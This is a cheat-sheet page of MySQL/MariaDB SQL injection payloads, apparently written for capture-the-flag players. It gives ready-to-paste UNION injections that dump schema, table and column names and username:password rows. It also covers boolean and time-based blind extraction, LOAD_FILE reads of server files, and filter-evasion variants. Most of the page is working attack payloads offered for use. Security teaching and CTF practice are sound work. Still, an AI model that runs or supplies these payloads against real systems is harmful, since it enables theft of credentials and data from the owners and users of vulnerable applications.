---
title: "02 · SQLi — MySQL / MariaDB"
weight: 11
bookToc: true
---

# MySQL / MariaDB SQLi

**Prerequisite:** a confirmed injection, correct closure, column count, and reflected text slot. If not, start with [SQLi](../sqli/).

The first payload below assumes a single-quoted input, three columns, and the second column displayed. Queries after it are **fragments** to adapt into that same UNION slot.

## 1. Confirm engine and current schema

```sql
missing' UNION SELECT NULL,CONCAT_WS(':',VERSION(),DATABASE(),CURRENT_USER()),NULL-- -
```

`VERSION()` distinguishes a MySQL/MariaDB build when its output is visible. `DATABASE()` can be NULL when no default schema is selected. `CURRENT_USER()` describes the account used for privilege checks; `USER()` describes the connection identity.

## 2. Enumerate schemas and tables

```sql
SELECT schema_name FROM information_schema.schemata;

SELECT table_name
FROM information_schema.tables
WHERE table_schema=DATABASE()
ORDER BY table_name;
```

One displayed field:

```sql
missing' UNION SELECT NULL,GROUP_CONCAT(table_name SEPARATOR ','),NULL FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

If nothing appears, inspect the active schema and privileges; do not assume a guessed `users` table exists.

## 3. Enumerate columns

```sql
SELECT column_name,data_type
FROM information_schema.columns
WHERE table_schema=DATABASE() AND table_name='users'
ORDER BY ordinal_position;
```

Complete example:

```sql
missing' UNION SELECT NULL,GROUP_CONCAT(CONCAT(column_name,':',data_type) ORDER BY ordinal_position SEPARATOR ','),NULL FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='users'-- -
```

Match both schema and table name. A same-named table in another database can otherwise confuse the output.

## 4. Read the target

```sql
SELECT id,username,password FROM users;
SELECT flag FROM flags;
SELECT username,password FROM users WHERE username='admin';
```

Combine fields / rows in one reflected slot:

```sql
missing' UNION SELECT NULL,GROUP_CONCAT(CONCAT_WS(':',id,username,password) SEPARATOR '|'),NULL FROM users-- -
```

`CONCAT()` returns NULL if an argument is NULL; `CONCAT_WS()` skips NULL values. Use `COALESCE(password,'<NULL>')` if distinguishing NULL matters. Long `GROUP_CONCAT` output may be truncated by server settings or application rendering. Read one ordered row at a time:

```sql
SELECT CONCAT_WS(':',id,username,password) FROM users ORDER BY id LIMIT 1 OFFSET 0;
SELECT CONCAT_WS(':',id,username,password) FROM users ORDER BY id LIMIT 1 OFFSET 1;
```

## 5. Boolean extraction expressions

Substitute these predicates into your established true/false request:

```sql
LENGTH(DATABASE())>5
SUBSTRING(DATABASE(),1,1)='c'
ASCII(SUBSTRING(DATABASE(),1,1))>109
EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=DATABASE() AND table_name='flags')
LENGTH((SELECT flag FROM flags ORDER BY id LIMIT 1))>20
ASCII(SUBSTRING((SELECT flag FROM flags ORDER BY id LIMIT 1),1,1))>109
```

`LENGTH()` measures bytes; `CHAR_LENGTH()` measures characters. `ASCII()` is convenient for ASCII flags; use `HEX()` / `ORD()` when byte representation matters. A scalar subquery must return at most one row.

## 6. Conditional delay

Numeric-context examples:

```sql
1 AND IF(1=1,SLEEP(2),0)=0
1 AND IF(1=2,SLEEP(2),0)=0
1 AND IF(ASCII(SUBSTRING(DATABASE(),1,1))>109,SLEEP(2),0)=0
```

A delay may execute once per candidate row or be optimized away. Use a narrow baseline query and alternate true/false probes. A single slow response is not proof. See [blind SQLi](../sqli-blind/).

## 7. File read, if privileges permit

```sql
SELECT LOAD_FILE('/flag.txt');
SELECT HEX(LOAD_FILE('/flag.txt'));
```

This reads on the **database server**, which might be a separate container. It needs the relevant file privilege, readable file, and compatible `secure_file_priv` configuration. NULL may mean any precondition failed, not that the file is absent. Enumerating the database is usually the shorter path.

## 8. Filter-specific alternatives

| Constraint actually observed | Candidate | Limit |
| --- | --- | --- |
| Literal spaces blocked | `UNION/**/SELECT` | Comments must reach the SQL parser |
| Quoted string blocked | `0x61646d696e` | MySQL hex literal for `admin`; coercion matters |
| `SUBSTRING` blocked | `MID(value,1,1)` | Same behavior only if allowed |
| Simple case-sensitive word match | `UnIoN SeLeCt` | SQL keyword case, not identifier case |
| Naive SQL comment filter | `/*!50000SELECT*/` | MySQL executable comment, version/context dependent |

Do not assume `||` means OR or concatenation: MySQL SQL modes can change its meaning. `UPDATEXML` / `EXTRACTVALUE` error payloads are legacy/version-dependent and are not a reliable MySQL 8 route.

Official references: [information functions](https://dev.mysql.com/doc/refman/8.4/en/information-functions.html), [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html), [string functions](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html).
